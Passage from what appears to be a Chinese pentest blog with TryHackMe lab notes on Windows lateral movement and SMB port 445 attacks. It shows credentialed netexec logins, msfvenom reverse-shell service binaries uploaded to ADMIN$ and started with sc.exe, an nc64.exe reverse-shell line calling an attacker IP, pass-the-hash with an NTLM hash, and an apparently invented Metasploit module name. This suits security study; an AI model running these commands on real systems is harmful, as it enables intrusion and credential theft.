class="meta prompt_"># </span><span class="language-bash">smb 连接</span> </span><br><span class="line">netexec smb $(IP) -u ftpuser -p &#x27;KeepGoingBro!!!&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ssh 连接</span></span><br><span class="line">netexec ssh $(IP) -u ftpuser -p &#x27;KeepGoingBro!!!&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ftp 连接</span></span><br><span class="line">netexec ftp $(IP) -u ftpuser -p &#x27;KeepGoingBro!!!&#x27;</span><br></pre></td></tr></table></figure><h5 id="6-1-netexec-of-msf"><a href="#6-1-netexec-of-msf" class="headerlink" title="6.1 netexec of msf"></a>6.1 <strong>netexec of msf</strong></h5><p><strong>Metasploit 示例：</strong></p><ol><li>启动 Metasploit。</li><li>选择模块（例如 <code>windows/smb/netexec</code>）。</li><li>配置目标 IP、用户名、密码等参数。</li><li>执行命令。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/netexec</span><br><span class="line">set RHOSTS 192.168.1.10</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set SMBPass password123</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h4 id="7-实战实例"><a href="#7-实战实例" class="headerlink" title="7. 实战实例"></a>7. 实战实例</h4><p>针对特定的本地任务</p><p><strong>用户：</strong> ZA.TRYHACKME.COM\t1_leonard.summers<br><strong>密码：</strong> EZpass4ever</p><p>虽然我们已经展示了如何使用 sc 在远程系统上创建用户（通过使用<code>net user</code> ），但我们还可以上传我们想要执行的任何二进制文件并将其与创建的服务关联。但是，如果我们尝试使用此方法运行反向 shell，我们会注意到反向 shell 在执行后立即断开连接。原因是服务可执行文件与标准 .exe 文件不同，因此非服务可执行文件几乎会立即被服务管理器杀死。对我们来说幸运的是，msfvenom 支持<code>exe-service</code>格式，它将我们喜欢的任何有效负载封装在功能齐全的服务可执行文件中，防止它被杀死。</p><p>在 Windows 中，<code>.exe</code> 文件是可执行文件的标准扩展名，用于运行程序。而 <code>exe-service</code> 可能指的是在服务环境中运行的可执行程序，通常是 Windows 服务（Service），它们在后台运行并可以在系统启动时自动启动。</p><p><strong>主要区别</strong>：</p><ul><li><strong><code>.exe</code> 文件</strong>：直接运行的程序，用户可以通过双击打开。</li><li><strong>Windows 服务</strong>：在后台运行的程序，通常以 <code>Service</code> 模式启动和管理。它们可以用 <code>sc</code> 命令或服务管理工具（如服务控制面板）来安装和管理。</li></ul><p>因此分析一下目前我们的优势，首先我们目前有对应横向主机的一个管理员用户，并且此时我们准备打算采用sc.exe的方式来创建对应的一个服务同时来执行相关命令，我们不来创建用户我们来直接用一个服务的可执行文件，我们可以使用直接用这个负载来反弹一个shell。</p><p>但是此时我们准备横向的是THMIIS  并且此时我们已经拿到对应的相关的THMIIS 上的一个管理员的凭据 那么此时我准备尝试不同的方式去横向到对应的 服务器上。</p><h5 id="7-1-ssh尝试"><a href="#7-1-ssh尝试" class="headerlink" title="7.1 ssh尝试"></a>7.1 ssh尝试</h5><p>首先根据我们的主旨，我们需要横向到对应的主机。第一步肯定是伪装我们目前是处于一个thmjmp2 的机器上我目前还不知道它属于什么组。可以查一下经过命令查询可以看到它属于domain 和 internet组 但是我目前想知道他属于哪一个ou<br>由于我发现我目前的凭证并不是管理员用户，所以我无法使用cmdlet 和mmc 进行收集。此时使用猎狗sharphound </p><p>首先使用ssh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh t1_leonard.summers@thmiis.za.tryhackme.com </span><br></pre></td></tr></table></figure><p>成功</p><h5 id="7-2-psexec"><a href="#7-2-psexec" class="headerlink" title="7.2 psexec"></a>7.2 psexec</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec64.exe \\thmiis.za.tryhackme.com  -u t1_leonard.summers   -p EZpass4ever -i cmd.exe</span><br></pre></td></tr></table></figure><p>这个不知道为啥一直失败</p><h5 id="7-3-winrm"><a href="#7-3-winrm" class="headerlink" title="7.3 winrm"></a>7.3 winrm</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs.exe -u:t1_leonard.summers -p:EZpass4ever -r:thmiis.za.tryhackme.com  cmd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240907211732.png" alt="image.png"></p><h5 id="7-4-sc-exe"><a href="#7-4-sc-exe" class="headerlink" title="7.4 sc.exe"></a>7.4 sc.exe</h5><p>windows服务相关的内容不再赘述，我们直接生成对应的exe-service</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.148.56 LPORT=4444 -o k1t0service.exe</span><br></pre></td></tr></table></figure><p>然后，我们将继续使用 t1_leonard.summers 凭据，使用 AttackBox 中的 smbclient 将有效负载上传到 THMIIS 的 ADMIN$ 共享：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -c &#x27;put k1t0service.exe&#x27; -U t1_leonard.summers -W ZA &#x27;//thmiis.za.tryhackme.com/admin$/&#x27; EZpass4ever</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240907213326.png" alt="image.png"><br>上传可执行文件后，我们将在攻击者的计算机上设置一个侦听器以接收来自<code>msfconsole</code>的反向 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">user@AttackBox$ </span><span class="language-bash">msfconsole</span></span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST lateralmovement</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 4444</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/shell/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.16:4444</span><br></pre></td></tr></table></figure><p>由于<code>sc.exe</code>不允许我们在命令中指定凭据，因此我们需要使用<code>runas</code>来生成带有 t1_leonard.summer 访问令牌的新 shell。尽管如此，我们只能通过SSH访问机器，所以如果我们尝试类似的操作 <code>runas /netonly /user:ZA\t1_leonard.summers cmd.exe</code> ，新的命令提示符将在用户的会话中生成，但我们无法访问它。为了解决这个问题，我们可以使用 runas 生成带有 t1_leonard.summers 访问令牌的第二个反向 shell：<br>其实这句话看似很难理解，其实仔细想一想真的很难理解吗？ HAHAH 其实只是因为啥呢?只是因为我们是用攻击盒进行渗透的。所以如果说我们runas 之后&#x2F;netonly 我们在盒子上是看不到这个cmd 会话的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers &quot;c:\tools\nc64.exe -e cmd.exe 10.50.148.56 4443&quot;</span><br></pre></td></tr></table></figure><p>此时需要在盒子上开一个nc -nvlp 4443<br>最后，继续使用 sc 远程创建一个新服务，并将其与我们上传的二进制文件关联起来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc.exe \\thmiis.za.tryhackme.com create THMservice-3244 binPath= &quot;%windir%\k1t0service.exe&quot; start= auto</span><br><span class="line">C:\&gt; sc.exe \\thmiis.za.tryhackme.com start THMservice-3244</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240908100905.png" alt="image.png"></p><p>成功使用sc 服务反弹回来一个shell ，并且是根据一个负载和一个服务捆绑。<br>但是一定要注意，我们的服务名称和一个服务的路径一定要是独属于自己的。</p><h4 id="8-netbios"><a href="#8-netbios" class="headerlink" title="8. netbios"></a>8. netbios</h4><p>netbios也是一个远程控制的一个协议,通过netbios我们可以像ssh一样进行一个远程控制</p><h5 id="8-1-开启netbios"><a href="#8-1-开启netbios" class="headerlink" title="8.1 开启netbios"></a>8.1 开启netbios</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sc config tlntsvr start= auto</span><br><span class="line">net start telnet</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看23 端口</span></span><br><span class="line">netstat -an</span><br></pre></td></tr></table></figure><h5 id="8-2-msf连接"><a href="#8-2-msf连接" class="headerlink" title="8.2 msf连接"></a>8.2 msf连接</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/telnet/telnet_login</span><br><span class="line"></span><br><span class="line">set RHOSTS 192.168.52.141</span><br><span class="line"></span><br><span class="line">set username hack</span><br><span class="line"></span><br><span class="line">set PASSWORD qaz@123</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h4 id="9-vnc"><a href="#9-vnc" class="headerlink" title="9.vnc"></a>9.vnc</h4><p>vnc并不是windows自带服务,我们要先判断是否vnc服务已经安装.</p><ol><li>netstat -an | find “5900”</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TCP 0.0.0.0:5900 0.0.0.0:0 LISTENING</span><br></pre></td></tr></table></figure><ol start="2"><li>服务<br>VNC 服务器通常会作为 Windows 服务启动。你可以通过以下步骤查看是否有 VNC 服务：</li></ol><ul><li>. 按 <strong>Win + R</strong> 键，输入 <code>services.msc</code> 然后按回车。</li><li>. 在服务列表中，查看是否有以下服务：<ul><li><strong>TightVNC Server</strong> 或 <strong>VNC Server</strong>。</li><li><strong>UltraVNC Server</strong>。</li><li><strong>RealVNC Server</strong>。</li></ul></li></ul><ol start="3"><li>进程</li></ol><p>你可以检查系统中是否有 VNC 服务或相关进程正在运行：</p><ul><li>按 <strong>Ctrl + Shift + Esc</strong> 打开 <strong>任务管理器</strong>。</li><li>查看是否有以下进程：<ul><li><strong>vncserver.exe</strong> 或 <strong>tvnserver.exe</strong>（TightVNC）</li><li><strong>winvnc.exe</strong>（UltraVNC）</li><li><strong>vncserver.exe</strong>（RealVNC）</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMB445端口利用</title>
      <link href="/2025/01/29/SMB445%E7%AB%AF%E5%8F%A3%E5%88%A9%E7%94%A8/"/>
      <url>/2025/01/29/SMB445%E7%AB%AF%E5%8F%A3%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>SMB协议是一种在局域网上共享文件、打印机、串行端口等资源的网络通信协议。它最初由IBM开发，后来被微软广泛采用，并成为Windows操作系统中文件共享的基础协议之一。SMB协议通常在TCP&#x2F;IP网络上运行，使用TCP端口445进行通信。</p><h4 id="1-SMB协议的主要特点包括："><a href="#1-SMB协议的主要特点包括：" class="headerlink" title="1. SMB协议的主要特点包括："></a>1. SMB协议的主要特点包括：</h4><ol><li>**文件和打印共享:**SMB协议允许网络中的计算机共享文件和打印机资源。用户可以在网络上访问共享的文件夹，并打印文档到共享的打印机。<ol><li><strong>目录浏览和操作：</strong> SMB协议允许客户端浏览远程计算机上的目录结构，并进行文件和文件夹的创建、删除、移动等操作。</li><li><strong>文件传输和访问控制：</strong> 通过SMB，用户可以在网络上传输文件，并可以根据访问控制列表（ACL）对共享资源进行权限管理。</li><li><strong>身份验证和会话管理：</strong> SMB协议支持用户身份验证机制，以确保只有授权用户可以访问共享资源。它还管理与服务器的会话，以跟踪客户端与服务器之间的连接状态。</li><li><strong>消息传递和通知：</strong> SMB协议还支持客户端和服务器之间的消息传递，用于通知客户端有关资源状态的变化或其他事件的发生。</li></ol></li></ol><h4 id="2-常见访问端口"><a href="#2-常见访问端口" class="headerlink" title="2. 常见访问端口"></a>2. 常见访问端口</h4><ol><li><p>139</p></li><li><p>445</p></li><li><p>**<strong>NetBIOS服务（端口139）</strong>：</p><ul><li>NetBIOS（Network Basic Input&#x2F;Output System）是一种网络通信协议，旨在使不同计算机之间能够进行通信和资源共享。它提供了一种简单的方法来发现和连接其他计算机，并允许它们在网络上共享文件和打印机等资源。通常，NetBIOS服务使用TCP端口139。</li><li>NetBIOS服务在早期的局域网环境中得到了广泛应用，但随着时间的推移，它已被更现代化的网络服务所取代，如SMB（Server Message Block）。</li></ul></li><li><p>*<strong>Microsoft-DS服务（端口445）</strong>：</p><ul><li>Microsoft-DS（Microsoft Directory Services）是微软的文件共享服务，也称为SMB（Server Message Block）。它是用于在Windows操作系统上进行文件和打印机共享的通信协议。</li><li>Microsoft-DS服务通过TCP端口445进行通信。它提供了更强大和安全的文件共享功能，支持更多的操作系统和网络环境。与NetBIOS相比，Microsoft-DS在性能和安全性方面更加先进和可靠。</li></ul></li></ol><h4 id="3-namp-脚本探测"><a href="#3-namp-脚本探测" class="headerlink" title="3. namp 脚本探测"></a>3. namp 脚本探测</h4><blockquote><p>nmap -p 445 –script&#x3D;smb-enum-shares.nse,smb-enum-users.nse 10.10.29.173</p></blockquote><p>使用工具扫描[[端口信息深入收集#enum4linux#]]</p><ul><li><code>nmap</code>: 这是一个网络探测和安全审核工具，用于发现主机和服务，以及识别网络中的漏洞。</li><li><code>-p 445</code>: 这个参数指定了要扫描的目标端口，即445端口，这是用于Microsoft-DS（SMB）服务的默认端口。</li><li><code>--script=smb-enum-shares.nse,smb-enum-users.nse</code>: 这个参数指定了要在扫描期间运行的Nmap脚本。具体来说，<code>smb-enum-shares.nse</code>用于枚举共享资源，<code>smb-enum-users.nse</code>用于枚举用户信息。</li><li><code>10.10.29.173</code>: 这是目标主机的IP地址，即要进行扫描和脚本运行的主机。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">   Host script results:</span><br><span class="line">| smb-enum-shares: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   \\10.10.29.173\IPC$: </span><br><span class="line">|     Type: STYPE_IPC_HIDDEN</span><br><span class="line">|     Comment: IPC Service (kenobi server (Samba, Ubuntu))</span><br><span class="line">|     Users: 2</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">   Path: C:\tmp</span><br><span class="line">|     Anonymous access: READ/WRITE</span><br><span class="line">r|     Current user access: READ/WRITE</span><br><span class="line">|   \\10.10.29.173\anonymous: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: </span><br><span class="line">|     Users: 0</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\home\kenobi\share</span><br><span class="line">|     Anonymous access: READ/WRITE</span><br><span class="line">|     Current user access: READ/WRITE</span><br><span class="line"></span><br><span class="line">|   \\10.10.29.173\print$: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: Printer Drives</span><br><span class="line">|     Users: 0</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\var\lib\samba\printers</span><br><span class="line">|   匿名用户  </span><br><span class="line">Anonymous access: &lt;none&gt;</span><br><span class="line">当前用户</span><br><span class="line">|_    Current user access: &lt;none</span><br></pre></td></tr></table></figure><h5 id="So-到底什么是共享文件"><a href="#So-到底什么是共享文件" class="headerlink" title="So? 到底什么是共享文件?"></a>So? 到底什么是共享文件?</h5><blockquote><p>共享资源是计算机网络中可供多个用户访问和使用的文件夹、打印机、文件等资源。通过共享资源，用户可以在网络上共享数据、打印机等设备，从而方便多人协作和资源共享。<br>在Windows系统中，SMB（Server Message Block）协议通常用于实现共享资源。通过SMB，计算机可以共享文件和打印机，其他计算机则可以通过网络连接到这些共享资源并访问它们。</p></blockquote><ul><li><code>IPC$</code>：IPC共享用于进程间通信，允许进程在不同的计算机之间进行通信。通常情况下，IPC共享不需要用户进行访问，但这里显示了匿名访问和当前用户访问都具有读写权限。</li><li><code>anonymous</code>：匿名共享允许任何人在网络上访问指定的路径，而无需提供用户名和密码。在这种情况下，匿名用户可以在<code>C:\home\kenobi\share</code>路径上进行读写操作。</li><li><code>print$</code>：打印机共享用于共享打印机驱动程序。这个共享没有匿名访问或当前用户访问权限，因此只能被特定用户或者具有特定权限的用户访问。</li></ul><h4 id="4-smbclient"><a href="#4-smbclient" class="headerlink" title="4. smbclient"></a>4. smbclient</h4><p><code>smbclient</code>是一个用于与SMB（Server Message Block）协议兼容的服务器进行通信的命令行工具。它通常用于在UNIX和Linux系统中访问Windows共享文件夹，但也可以在Windows系统上使用。</p><p>通过<code>smbclient</code>，你可以执行各种操作，包括列出共享资源、访问共享文件夹、上传和下载文件等。下面是一些<code>smbclient</code>的常用用法：</p><ol><li><p>列出共享资源：</p><p> <code>smbclient -L //server_ip</code></p></li><li><p>使用用户名和密码登录到共享文件夹：</p><p> <code>smbclient //server_ip/share_name -U username</code></p></li><li><p>查看共享文件夹中的文件和目录：<br> <code>smb: \&gt; dir</code></p></li><li><p>下载文件到本地系统：<br> <code>smb: \&gt; get filename</code></p></li><li><p>上传文件到共享文件夹：<br> <code>smb: \&gt; put local_filename</code></p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 smbclient.py gapfactories.local/mspadmin@10.2.40.90 --hashes &quot;:e20e81c5c06ccf288474c581f13423b9&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">shares</span></span><br><span class="line"><span class="meta prompt_">ADMIN$</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">C$</span></span><br><span class="line"><span class="meta prompt_">E$</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">Insurances</span></span><br><span class="line"><span class="meta prompt_">IPC$</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">it</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">use E$</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tree</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>***全部下载smbget -R smb:&#x2F;&#x2F;10.10.29.173&#x2F;anonymous</p><p><code>上述get命令</code> 和 <code>smbget</code> 是两个不同的命令，它们在功能和用法上有所不同。</p><ul><li><p><code>get</code> 是一个基本的文件传输命令，通常在FTP和类似协议中使用。在SMB（Server Message Block）协议中，您也可以使用 <code>get</code> 命令来下载单个文件，例如：<code>smbclient //10.10.29.173/anonymous -c &#39;get filename.txt&#39;</code>，其中 <code>filename.txt</code> 是要下载的文件名。这个命令将会把 <code>filename.txt</code> 文件从 <code>anonymous</code> 共享目录下载到当前工作目录。</p></li><li><p><code>smbget</code> 是一个专门用于通过SMB协议下载文件的命令行工具。它的功能更加强大，可以递归下载整个目录结构，包括所有子目录和文件。在您提供的命令中，<code>-R</code> 参数表示递归下载。</p></li></ul><p>因此，主要区别在于 <code>get</code> 命令只能下载单个文件，而 <code>smbget</code> 命令可以递归下载整个目录。根据您的需求，您可以选择使用其中的一个命令来下载所需的文件或目录。</p><h5 id="匿名登陆"><a href="#匿名登陆" class="headerlink" title="匿名登陆"></a>匿名登陆</h5><p><img src="/Pasted%20image%2020240415213256.png">使用上述例子匿名访问看看能不能登陆一波</p><blockquote><p>***smbclient &#x2F;&#x2F;10.10.29.173&#x2F;anonymous<br>或者smbclient  &#x2F;&#x2F;10.10.29.173 -N</p></blockquote><ol><li>smbclient -L \10.10.14.193 -N<br> 这里的<code>-N</code>选项表示尝试匿名登录。如果成功连接并列出了共享资源，说明匿名访问是被允许的。</li></ol><h5 id="用户登陆"><a href="#用户登陆" class="headerlink" title="用户登陆"></a>用户登陆</h5><ol><li><p><strong>登录到 SMB 共享资源</strong>：一旦 <code>smbclient</code> 安装完成，可以使用以下命令登录到 SMB 共享资源：<br> <code>smbclient //server/share -U username%password</code></p><ul><li><code>//server/share</code> 是 SMB 服务器的地址和共享资源名称。替换 <code>server</code> 为实际的 SMB 服务器地址，<code>share</code> 为实际的共享资源名称。</li><li><code>username</code> 是你的 SMB 账户的用户名。</li><li><code>password</code> 是你的 SMB 账户的密码。</li></ul><p> 例如，假设你要连接到地址为 <code>10.0.0.1</code> 的 SMB 服务器上的名为 <code>public</code> 的共享资源，用户名是 <code>user1</code>，密码是 <code>pass123</code>，那么命令将是：</p><p> <code>smbclient //10.0.0.1/public -U user1%pass123</code></p></li></ol><h4 id="5-Msf中的smb"><a href="#5-Msf中的smb" class="headerlink" title="5. Msf中的smb"></a>5. Msf中的smb</h4><p>SMB (Server Message Block) 是一种网络通信协议，主要用于在Windows网络环境中实现文件和打印服务的共享。SMB最初是由IBM和Sytek于1987年开发，后来被Microsoft采纳并发展成为其Windows操作系统中的核心网络协议之一。<br>SMB协议允许应用程序在客户端和服务器之间进行通信，以读取、写入和管理共享的文件、打印机以及其他资源。它通常运行在TCP&#x2F;IP协议之上，使用端口445（SMB over TCP）或端口139（SMB over NetBIOS）。</p><p>***您还可以遇到一些共享文件和文件夹，这些文件和文件夹可以在没有密码的情况下访问或使用简单密码（例如 admin、administrator、root、toor 等）进行保护。</p><p>SMB有几个不同的版本，包括：</p><ol><li>SMB 1.0 (也称为CIFS，Common Internet File System)：这是最初的SMB版本，已经过时并且存在安全漏洞。Microsoft推荐不再使用SMB 1.0。</li><li>SMB 2.0：这是一个更新的版本，提供了更高的性能、安全性和功能。它支持更大的文件、加密、多通道通信以及其他特性。</li><li>SMB 2.1 和 SMB 3.0：这些后续版本进一步增强了SMB协议的性能和安全性，提供了如目录租赁、加密和身份验证等新特性。</li><li>SMB 3.1 和 SMB 3.1.1：这些版本进一步扩展了SMB的功能，包括支持存储空间的直接访问、文件透明加密、更高效的身份验证等</li></ol><h5 id="5-1-永恒之蓝漏洞"><a href="#5-1-永恒之蓝漏洞" class="headerlink" title="5.1 永恒之蓝漏洞:"></a>5.1 永恒之蓝漏洞:</h5><p>SMB协议通常使用TCP 139和TCP 445端口。然而，需要注意的是，即使SMB端口是开放的，并不意味着系统就一定会受到永恒之蓝漏洞的攻击。为了成功利用这个漏洞，攻击者还需要满足其他条件，例如目标系统必须未打补丁或未采取其他安全措施等。</p><h5 id="5-2-“DoublePulsar”-漏洞"><a href="#5-2-“DoublePulsar”-漏洞" class="headerlink" title="5.2 “DoublePulsar” 漏洞:"></a>5.2 “DoublePulsar” 漏洞:</h5><p>“DoublePulsar” 漏洞是一个在 Windows 系统的 Server Message Block (SMB) 中发现的严重安全漏洞。这个漏洞允许远程攻击者在目标系统上执行恶意代码，从而实现对该系统的完全控制。</p><p>“DoublePulsar” 是一个后门程序，由黑客组织 Shadow Brokers 在 2017 年泄露的一系列 NSA（美国国家安全局）工具中被公开。这个后门程序最初被设计用于NSA进行网络监听和监控活动，但泄露后，它成为了公众关注的焦点，并被广泛用于恶意活动和网络攻击中。</p><p>“DoublePulsar” 漏洞的利用过程涉及到攻击者向目标系统发送特制的 SMB 数据包，利用该漏洞在目标系统上执行恶意代码。一旦成功利用该漏洞，攻击者可以获得对目标系统的完全控制权，执行任意命令，收集敏感信息，进行进一步的网络渗透等。</p><h4 id="6-Msf-smb协议模块弱点利用"><a href="#6-Msf-smb协议模块弱点利用" class="headerlink" title="6. Msf smb协议模块弱点利用:"></a>6. Msf smb协议模块弱点利用:</h4><h6 id="auxiliary-scanner-smb-impacket-dcomexec"><a href="#auxiliary-scanner-smb-impacket-dcomexec" class="headerlink" title="auxiliary&#x2F;scanner&#x2F;smb&#x2F;impacket&#x2F;dcomexec"></a>auxiliary&#x2F;scanner&#x2F;smb&#x2F;impacket&#x2F;dcomexec</h6><p>auxiliary&#x2F;scanner&#x2F;smb&#x2F;impacket&#x2F;dcomexec 是一个在 Metasploit 框架中用于扫描和利用 Microsoft DCOM (Distributed Component Object Model) 漏洞的模块。这个模块利用了 impacket 库，这是一个用于处理 Microsoft 网络协议（如 SMB, LDAP, HTTP 等）的 Python 库。</p><p>DCOM 是 Microsoft 的一种组件对象模型 (COM) 的分布式扩展，它允许对象跨网络边界进行通信。然而，由于 DCOM 的某些实现存在安全漏洞，攻击者可以利用这些漏洞来执行远程代码或提升权限。</p><p>auxiliary&#x2F;scanner&#x2F;smb&#x2F;impacket&#x2F;dcomexec 模块通常用于识别和利用这些 DCOM 相关的漏洞。这个模块会尝试与目标系统建立 DCOM 会话，并执行恶意代码或命令。</p><h6 id="auxiliary-scanner-smb-impacket-secretsdump"><a href="#auxiliary-scanner-smb-impacket-secretsdump" class="headerlink" title="auxiliary&#x2F;scanner&#x2F;smb&#x2F;impacket&#x2F;secretsdump"></a>auxiliary&#x2F;scanner&#x2F;smb&#x2F;impacket&#x2F;secretsdump</h6><p>auxiliary&#x2F;scanner&#x2F;smb&#x2F;impacket&#x2F;secretsdump 是 Metasploit 框架中的一个辅助模块，它利用 impacket 库来从 SMB（Server Message Block）会话中提取密码和其他敏感信息。这个模块特别针对 Windows 系统，并且经常被用于渗透测试和安全评估中，以获取存储在系统上的明文或哈希密码。</p><p>具体来说，secretsdump 模块可以：</p><ol><li>提取 NTLM 哈希：它可以尝试从目标系统中提取存储的 NTLM（NT LAN Manager）哈希。这些哈希通常用于 Windows 身份验证，并且可以被用来进行密码破解。</li><li>获取明文密码：在某些情况下，如果攻击者具有足够的权限，secretsdump 还能够提取明文密码。这通常发生在密码被以明文形式存储在注册表或其他位置时。</li><li>获取 Kerberos 票据：这个模块还可以提取 Kerberos 票据，这些票据用于在 Windows 域环境中进行身份验证。</li></ol><p>要使用 secretsdump 模块，攻击者需要能够与目标 Windows 系统建立有效的 SMB 会话。这通常意味着攻击者需要知道有效的用户名和密码，或者使用其他技术（如 SMB 中继、中间人攻击等）来拦截或模拟合法的 SMB 会话。</p><h4 id="Msf-exp"><a href="#Msf-exp" class="headerlink" title="Msf exp"></a>Msf exp</h4><h5 id="exploit-windows-smb-ms17-010-eternalblue"><a href="#exploit-windows-smb-ms17-010-eternalblue" class="headerlink" title="exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue"></a>exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</h5><p>是 Metasploit 框架中的一个攻击模块，用于利用前面提到的 MS17-010 漏洞（也称为“永恒之蓝”漏洞）。这个模块允许攻击者远程执行代码并获得对受影响 Windows 系统的完全控制权。</p><p>要使用这个攻击模块，你需要先确保目标系统存在 MS17-010 漏洞，这通常通过使用 auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010 辅助模块进行扫描来确认。一旦确认目标系统存在漏洞，你就可以使用 exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue 模块来发起攻击。</p><p>在使用这个模块时，你需要设置一些参数，如目标主机的 IP 地址（RHOST）、要使用的有效载荷（payload）等。有效载荷是在成功利用漏洞后要在目标系统上执行的代码或命令。</p><h5 id="exploit-windows-smb-ms17-010-psexec"><a href="#exploit-windows-smb-ms17-010-psexec" class="headerlink" title="exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec"></a>exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</h5><p>是 Metasploit Framework 中的一个攻击模块，用于利用 Microsoft Windows 系统中的 MS17-010 漏洞（也称为“永恒之蓝”漏洞）。这个模块利用该漏洞执行远程代码，允许攻击者在目标系统上执行任意命令。</p><p>这个模块特别有用，因为它提供了一个在成功利用漏洞后执行任意 PowerShell 命令的能力。通过执行 PowerShell 脚本，攻击者可以获得对目标系统的完全控制，并执行各种恶意操作，如安装软件、删除文件、窃取敏感信息等。</p><p>要使用 